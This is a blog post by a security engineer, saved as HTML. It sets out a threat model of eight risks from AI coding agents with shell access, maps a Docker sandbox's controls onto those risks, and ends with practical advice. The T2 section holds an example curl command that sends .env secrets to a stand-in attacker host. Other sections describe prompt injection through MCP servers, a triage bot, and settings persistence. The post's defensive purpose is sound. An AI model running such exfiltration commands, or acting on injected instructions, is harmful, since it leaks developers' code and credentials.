@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The threat model that made me sandbox my AI agents | AccidentalRebel.com</title>
+
+<meta name="description" content="AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.">
+
+    <link rel="canonical" href="./the-threat-model-that-made-me-sandbox-my-ai-agents.html">
+
+    <link href="https://www.accidentalrebel.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="AccidentalRebel.com Atom Feed" />
+
+    <link rel="stylesheet" href="./theme/css/main.css">
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "AccidentalRebel",
+        "url": ".",
+        "sameAs": ["mailto:karlo@accidentalrebel.com", "https://www.linkedin.com/in/juan-karlo-licudine/", "https://github.com/accidentalrebel"]
+    }
+    </script>
+
+    <meta name="author" content="AccidentalRebel">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="./the-threat-model-that-made-me-sandbox-my-ai-agents.html">
+    <meta property="og:title" content="The threat model that made me sandbox my AI agents">
+    <meta property="article:author" content="AccidentalRebel">
+    <meta property="article:published_time" content="2026-02-24T20:00:00+08:00">
+    <meta property="og:description" content="AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.">
+    <meta property="og:image" content="./images/the-threat-model-that-made-me-sandbox-my-ai-agents.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="./the-threat-model-that-made-me-sandbox-my-ai-agents.html">
+    <meta property="twitter:title" content="The threat model that made me sandbox my AI agents">
+    <meta property="twitter:description" content="AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.">
+    <meta property="twitter:image" content="./images/the-threat-model-that-made-me-sandbox-my-ai-agents.png">
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "headline": "The threat model that made me sandbox my AI agents",
+        "datePublished": "2026-02-24T20:00:00+08:00",
+        "author": { "@type": "Person", "name": "AccidentalRebel" },
+        "publisher": { "@type": "Person", "name": "AccidentalRebel" },
+        "url": "./the-threat-model-that-made-me-sandbox-my-ai-agents.html",
+        "description": "AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.",
+        "image": "./images/the-threat-model-that-made-me-sandbox-my-ai-agents.png"
+    }
+    </script>
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            { "@type": "ListItem", "position": 1, "name": "Home", "item": "./" },
+            { "@type": "ListItem", "position": 2, "name": "Security", "item": "./category/security.html" },
+            { "@type": "ListItem", "position": 3, "name": "The threat model that made me sandbox my AI agents" }
+        ]
+    }
+    </script>
+</head>
+<body>
+    <div class="rebel-stripe"></div>
+    <div class="progress-bar" id="progress"></div>
+
+    <header>
+        <div class="container-wide">
+            <nav>
+                <a href="./" class="site-title">Accidental<span class="rebel">Rebel</span>.com</a>
+                <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+                <ul class="nav-links" id="navLinks">
+                    <li><a href="./archives.html">Archives</a></li>
+                    <li><a href="./categories.html">Categories</a></li>
+                    <li><a href="./tags.html">Tags</a></li>
+                            <li><a href="./category/cybersecurity-x-ai-news-roundup.html">Newsletter</a></li>
+                            <li><a href="./pages/about.html">About</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container-wide">
+            <div class="layout">
+                <div class="content">
+<article>
+    <header class="article-header">
+        <a href="./category/security.html" class="article-category-label">Security</a>
+        <h1>The threat model that made me sandbox my AI agents</h1>
+        <div class="article-meta">
+            <time datetime="2026-02-24T20:00:00+08:00">Tue 24 February 2026</time>
+        </div>
+    </header>
+
+    <div class="article-content">
+        <blockquote>
+<p><strong>TLDR:</strong> AI coding agents have shell access to your machine. They can run commands, modify files, and reach the network. I mapped 8 threats that come with that access and built a container sandbox to contain them.</p>
+</blockquote>
+<h2 id="what-youre-actually-running">What you're actually running</h2>
+<p>When you launch Claude Code or Codex CLI, you're giving an LLM a terminal. Both tools have built-in safety controls. Claude Code prompts before executing shell commands, scopes its file editing tools to the working directory, and offers an optional OS-level sandbox. Codex goes further with sandboxing enabled by default and network access disabled out of the box.</p>
+<p>These are real protections. But they depend on user discipline. Pre-approve <code>Bash(*)</code> in your settings (common), click "allow" without reading the command (I do this constantly, because who has time to review every shell command?), or run in <code>bypassPermissions</code> mode for convenience, and you're back to an LLM with unrestricted shell access. I wanted isolation that doesn't break when someone (read: me) gets careless or clicks through a prompt on autopilot.</p>
+<p>The problem isn't that these tools are malicious. The problem is that they're unpredictable. An LLM might run a command you didn't expect. A compromised MCP server could inject instructions. A poisoned dependency could execute code during install. The attack surface is wide and mostly unmonitored.</p>
+<h2 id="the-threat-model">The threat model</h2>
+<p>With these threats in mind, I built <a href="./running-ai-agents-in-a-box.html">Claudecker</a>, a shell script that wraps Docker to run Claude Code and Codex CLI in an isolated container. Point it at a project directory, and the AI agent runs inside the container with only that directory mounted. Everything else on your host is invisible to it.</p>
+<p>It worked and I kept using it. But as I kept covering <a href="./your-ai-assistant-might-be-working-for-someone-else.html">AI security incidents in my news roundups</a>, I realized I should sit down and map out what Claudecker is actually protecting against. Not theoretical nation-state attacks, but realistic scenarios for a developer running AI agents daily. And I run them a lot. I try every new CLI tool, every new model, every new MCP server that shows up on my feed. I'm exactly the kind of user who needs guardrails.</p>
+<p><img alt="Threat model diagram" src="./images/the-threat-model-that-made-me-sandbox-my-ai-agents.png" /></p>
+<p>Above is the threat model I came up with. The goal isn't to be exhaustive. It's to name the specific things that could go wrong when an AI agent has shell access to a developer's machine, and what Claudecker actually mitigates (more details in the next section).</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat</th>
+<th>What goes wrong</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1</td>
+<td>Host filesystem access</td>
+<td>Agent reads files outside the project directory</td>
+</tr>
+<tr>
+<td>T2</td>
+<td>Data exfiltration</td>
+<td>Agent sends code or secrets to external endpoints</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>Supply chain injection</td>
+<td>Compromised package executes on the host</td>
+</tr>
+<tr>
+<td>T4</td>
+<td>Credential theft</td>
+<td>Agent reads SSH keys, API tokens, cloud credentials</td>
+</tr>
+<tr>
+<td>T5</td>
+<td>Lateral movement</td>
+<td>Agent reaches internal network services</td>
+</tr>
+<tr>
+<td>T6</td>
+<td>Settings persistence</td>
+<td>Compromised session alters agent config permanently</td>
+</tr>
+<tr>
+<td>T7</td>
+<td>Privilege escalation</td>
+<td>Agent gains root or elevated capabilities</td>
+</tr>
+<tr>
+<td>T8</td>
+<td>Cross-project contamination</td>
+<td>Secrets from one project leak into another session</td>
+</tr>
+</tbody>
+</table>
+<h3 id="t1-host-filesystem-access">T1: Host filesystem access</h3>
+<p>The AI operates on your project directory. But nothing stops it from reading files anywhere else on your machine. Other projects, personal documents, company files, system configs. Anything your user account can access, the agent can access.</p>
+<p>This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. You don't want an agent casually reading through your other project directories or your company's internal documentation just because it's curious.</p>
+<h3 id="t2-data-exfiltration">T2: Data exfiltration</h3>
+<p>An agent with network access can send your code anywhere. It could be something obvious like <code>curl attacker.com -d "$(cat .env)"</code>, or something subtle buried in a script it generates. You probably wouldn't notice either way.</p>
+<p>This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network.</p>
+<p>We've already seen this pattern in the news where <a href="./developer-tools-are-the-new-attack-surface.html">malicious VS Code AI extensions stole source code from 1.5 million installs</a>. An AI coding agent with network access is the same exfiltration vector, just with more reasoning capability.</p>
+<h3 id="t3-supply-chain-injection">T3: Supply chain injection</h3>
+<p>When an agent runs <code>npm install</code> or <code>pip install</code>, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. This isn't unique to AI agents, but agents make it worse because they install packages autonomously without you reviewing each one.</p>
+<p>This already happened. A <a href="./your-ai-assistant-might-be-working-for-someone-else.html">supply chain attack on Cline CLI</a> compromised the npm publish token. The poisoned package was downloaded roughly 4,000 times in an 8-hour window before it was pulled, installing an autonomous AI agent on each machine. The attacker used prompt injection against Cline's own AI issue triage to steal the token.</p>
+<h3 id="t4-credential-theft">T4: Credential theft</h3>
+<p>SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already <a href="./your-ai-assistant-might-be-working-for-someone-else.html">picking up AI agent configuration files and gateway tokens</a> through broad file-grabbing routines, and dedicated targeting is likely next.</p>
+<p>Claude Code's own <a href="https://docs.anthropic.com/en/docs/claude-code/security#sandboxing">sandboxing documentation</a> acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."</p>
+<h3 id="t5-lateral-movement">T5: Lateral movement</h3>
+<p>An agent with network access can reach anything on your local network. Other machines, internal services, databases. If you're on a corporate network, an agent is one <code>curl</code> away from touching infrastructure it has no business accessing. CrowdStrike documented how <a href="./ai-agents-under-attack.html">agentic tool chain attacks</a> exploit this implicit trust to achieve code execution and data exfiltration through legitimate agent workflows.</p>
+<h3 id="t6-settings-persistence">T6: Settings persistence</h3>
+<p>A compromised session could modify the agent's own configuration to persist across restarts. Injecting a malicious MCP server, changing allowed tool permissions, or altering default behaviors. The next time you start a session, the compromise is already there. Check Point showed that <a href="./your-ai-assistant-might-be-working-for-someone-else.html">AI assistants can be quietly repurposed as C2 channels</a> using this kind of persistence. The AI does exactly what it's designed to do. It's just doing it for someone else.</p>
+<h3 id="t7-privilege-escalation">T7: Privilege escalation</h3>
+<p>If the agent can run <code>sudo</code>, the non-root user boundary means nothing. And it's easier to end up there than you'd think. Claude Code scopes permissions to specific command patterns, so approving <code>sudo apt install curl</code> doesn't automatically approve <code>sudo rm -rf /</code>. But approve a command once and select "Don't ask again," and it's written to <code>settings.local.json</code> as a permanent allow rule for that project. Every future <code>sudo</code> matching that pattern goes through without a prompt. One careless click with a broad pattern and you've handed the agent root.</p>
+<h3 id="t8-cross-project-contamination">T8: Cross-project contamination</h3>
+<p>If you're working on multiple projects, credentials from one project session shouldn't be accessible in another. But without isolation, they share the same home directory, the same SSH keys, the same environment variables. If you're doing client work, this is a confidentiality problem. An agent working on your personal project can read the <code>.env</code> from a client project sitting in the next directory over.</p>
+<h2 id="what-claudecker-protects-against">What Claudecker protects against</h2>
+<p>Here's how each control currently implemented in Claudecker maps to the threats above (✅ = mitigated by this control):</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>T1</th>
+<th>T2</th>
+<th>T3</th>
+<th>T4</th>
+<th>T5</th>
+<th>T6</th>
+<th>T7</th>
+<th>T8</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Docker container isolation</td>
+<td>✅</td>
+<td></td>
+<td>✅</td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Ephemeral containers (<code>--rm</code>)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Non-root user + scoped sudo</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+</tr>
+<tr>
+<td>iptables allowlist firewall</td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Network lockdown (domain allowlist)</td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>SSH agent forwarding (no key files)</td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Volume isolation per profile</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Runtime settings rebuild</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Skills hash caching</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>✅</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Some of these are strong mitigations. Others are just friction. I want to be honest about which is which.</p>
+<h3 id="container-isolation-mitigates-t1-t3-t4">Container isolation (mitigates T1, T3, T4)</h3>
+<p>The most basic control. Claude Code runs inside a Docker container. The only host directory mounted is the project itself. The agent can't read <code>~/.ssh/</code> or <code>~/.aws/</code> because those paths don't exist inside the container.</p>
+<div class="codehilite"><pre><span></span><code>./claudecker.sh<span class="w"> </span>run<span class="w"> </span>/path/to/project
+</code></pre></div>
+
+<p>The container runs as the unprivileged <code>node</code> user, not root. Sudo is locked down to five specific commands, all related to firewall management and SSH socket setup.</p>
+<ul>
+<li><strong>Strength: strong.</strong> The agent literally cannot access host files outside the mounted project directory.</li>
+<li><strong>Gap:</strong> The project directory itself is fully accessible. If you have <code>.env</code> files or secrets in your project tree, the agent can read them.</li>
+</ul>
+<h3 id="network-firewall-mitigates-t2-t3-t5">Network firewall (mitigates T2, T3, T5)</h3>
+<p>By default, Claudecker containers have full outbound access. The container isn't reachable from the internet (no published ports), but the agent can reach anything on the internet.</p>
+<p>For sensitive work, there's a lockdown mode that activates an iptables-based firewall restricting outbound traffic to IPs resolved from a list of allowed domains:</p>
+<div class="codehilite"><pre><span></span><code>./claudecker.sh<span class="w"> </span>lockdown
+</code></pre></div>
+
+<p>The allowlist includes only what's needed: Anthropic's API, GitHub, npm registry, PyPI, and Ubuntu package repos. Everything else is dropped. The agent can't POST your source code to an arbitrary endpoint because it can't reach arbitrary endpoints. Claude Code still works because it can reach its API. Package installs still work. But exfiltration to an attacker-controlled domain gets blocked.</p>
+<ul>
+<li><strong>Strength: medium to strong.</strong> The allowlist approach prevents exfiltration to arbitrary domains while keeping the agent functional.</li>
+<li><strong>Gap:</strong> The allowlist is resolved via DNS at container startup. CDN IP rotation means a domain might resolve to a new IP mid-session that gets blocked. Also, IPv6 isn't firewalled, so if the container has IPv6 connectivity, that's an open channel. I need to fix that.</li>
+</ul>
+<h3 id="ephemeral-containers-mitigates-t3-t6">Ephemeral containers (mitigates T3, T6)</h3>
+<p>Every session starts fresh. The container is created with <code>--rm</code>, so it's destroyed on exit. Skills get reinstalled, settings get rebuilt from defaults. If a session gets compromised, the compromise dies with the container.</p>
+<p>Settings are rebuilt at runtime by layering defaults with user overrides. The runtime file lives at <code>/tmp/</code> and is never written back to persistent storage. A compromised session can't permanently alter the configuration.</p>
+<ul>
+<li><strong>Strength: strong for persistence prevention.</strong> A malicious modification to settings or installed packages doesn't survive a restart.</li>
+<li><strong>Gap:</strong> The config volume (auth tokens, MCP configs) does persist. If an attacker modifies something in that volume, it carries over.</li>
+</ul>
+<h3 id="ssh-agent-forwarding-not-key-storage-mitigates-t4">SSH agent forwarding, not key storage (mitigates T4)</h3>
+<p>SSH private keys never touch the container filesystem. Instead, the host's SSH agent socket is forwarded into the container, so the agent can authenticate without the key material being present.</p>
+<p>The agent can use the keys to authenticate (git push, git pull), but it can't read the key material. Even if the agent reads every file in the container, the private key bytes aren't there.</p>
+<ul>
+<li><strong>Strength: strong against key theft.</strong> The key material is genuinely inaccessible.</li>
+<li><strong>Gap:</strong> The agent socket itself still allows signing operations. A compromised session could push to any repo the key has access to. You're protecting the key, not the access.</li>
+</ul>
+<h3 id="profile-based-volume-isolation-mitigates-t8">Profile-based volume isolation (mitigates T8)</h3>
+<p>When I set <code>CLAUDE_PROFILE=work</code>, the Docker volume storing auth tokens and configs gets a <code>-work</code> suffix. Completely separate from my personal profile. Different API keys, different git identity, different MCP servers.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">CLAUDE_PROFILE</span><span class="o">=</span>work<span class="w"> </span>./claudecker.sh<span class="w"> </span>run<span class="w"> </span>/path/to/project
+</code></pre></div>
+
+<ul>
+<li><strong>Strength: strong.</strong> Profiles are fully isolated at the volume level.</li>
+<li><strong>Gap:</strong> If you forget to set the profile, you're on the default volume, shared across all unprofilied sessions.</li>
+</ul>
+<h2 id="isolation-without-crippling-the-tool">Isolation without crippling the tool</h2>
+<p>An AI coding agent needs shell access, file access, and network access to be useful. That's what makes it powerful. But I had to balance capability against security.</p>
+<p>Browsers figured this out with tabs. Package managers figured it out with install scripts. CI/CD figured it out with disposable containers. The answer isn't restricting what the agent can do. It's controlling the environment it does it in.</p>
+<p>That's what Claudecker does. The agent gets full shell access, full file access, and configurable network access, but all inside a container where the blast radius is limited to the project directory. It can do everything it needs to do. It just can't touch anything it shouldn't.</p>
+<p>I'm choosing tighter controls now because new threats keep showing up weekly. The eight I've listed here are just the ones I've identified so far. I'd rather have too much isolation than too little. You can always loosen restrictions. You can't undo a breach.</p>
+<h2 id="what-you-can-do-today">What you can do today</h2>
+<p>Claudecker isn't publicly available. It's deeply integrated into my personal workflow and not something anyone else can pick up and run. But you don't need my tool to act on this threat model. Here are four things you can do right now:</p>
+<ol>
+<li>
+<p><strong>Run your AI agent in a container.</strong> You don't need Claudecker for this. A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.</p>
+</li>
+<li>
+<p><strong>Enable Claude Code's built-in sandbox.</strong> Run <code>/sandbox</code> in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. <a href="https://code.claude.com/docs/en/sandboxing">Documentation here</a>.</p>
+</li>
+<li>
+<p><strong>Audit your <code>settings.local.json</code>.</strong> Open <code>.claude/settings.local.json</code> in your project directory and look at what you've approved. You might find <code>Bash(sudo:*)</code> or other broad patterns you don't remember approving. Clean it up.</p>
+</li>
+<li>
+<p><strong>Review what skills and MCP servers your agent loads.</strong> Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.</p>
+</li>
+</ol>
+<p>None of these require building anything. They're just decisions.</p>
+    </div>
+
+    <footer class="article-footer">
+        <div class="tags">
+            <a href="./tag/security.html" class="tag">security</a>
+            <a href="./tag/ai.html" class="tag">ai</a>
+            <a href="./tag/claude-code.html" class="tag">claude-code</a>
+            <a href="./tag/docker.html" class="tag">docker</a>
+            <a href="./tag/tools.html" class="tag">tools</a>
+        </div>
+    </footer>
+</article>
+
+
+<section class="newsletter-cta">
+    <h3>Get posts like this in your inbox</h3>
+    <p>Security research, malware analysis, and tools — no spam.</p>
+    <form
+        action="https://buttondown.com/api/emails/embed-subscribe/accidentalrebel"
+        method="post"
+        target="popupwindow"
+        class="newsletter-form"
+    >
+        <input type="email" name="email" placeholder="your@email.com" required />
+        <button type="submit">Subscribe</button>
+    </form>
+</section>
+
+<section class="comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="accidentalrebel/accidentalrebel.com"
+        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTkzODk2NjU="
+        data-category="Comments"
+        data-category-id="DIC_kwDOBx294c4C26p7"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+                </div>
+                <aside class="sidebar">
+                    <div class="sidebar-sticky">
+                        <img src="./theme/images/avatar.png" alt="AccidentalRebel" class="sidebar-avatar">
+                        <h3 class="sidebar-name">Accidental<span class="rebel">Rebel</span></h3>
+                        <p class="sidebar-realname">Juan Karlo Licudine</p>
+                        <p class="sidebar-bio">Defense-first security engineer who builds tools and thinks like an attacker. Now focused on where AI and security collide.</p>
+                        <ul class="sidebar-social">
+                            <li><a href="mailto:karlo@accidentalrebel.com" target="_blank" rel="noopener">Email</a></li>
+                            <li><a href="https://www.linkedin.com/in/juan-karlo-licudine/" target="_blank" rel="noopener">LinkedIn</a></li>
+                            <li><a href="https://github.com/accidentalrebel" target="_blank" rel="noopener">GitHub</a></li>
+                        </ul>
+                        <div class="sidebar-newsletter">
+                            <h4>For weekly CyberSecurity x AI news subscribe below</h4>
+                            <form
+                                action="https://buttondown.com/api/emails/embed-subscribe/accidentalrebel"
+                                method="post"
+                                target="popupwindow"
+                                class="sidebar-newsletter-form"
+                            >
+                                <input type="email" name="email" placeholder="your@email.com" required />
+                                <button type="submit">Subscribe</button>
+                            </form>
+                        </div>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container-wide">
+            <div class="footer-content">
+                <span>&copy; AccidentalRebel. Defense-first security engineer who builds tools and thinks like an attacker. Now focused on where AI and security collide.</span>
+                <ul class="footer-links">
+                    <li><a href="mailto:karlo@accidentalrebel.com" target="_blank" rel="noopener">Email</a></li>
+                    <li><a href="https://www.linkedin.com/in/juan-karlo-licudine/" target="_blank" rel="noopener">LinkedIn</a></li>
+                    <li><a href="https://github.com/accidentalrebel" target="_blank" rel="noopener">GitHub</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <script src="./theme/js/main.js"></script>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-55068085-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-55068085-2');
+    </script>
+</body>
+</html>
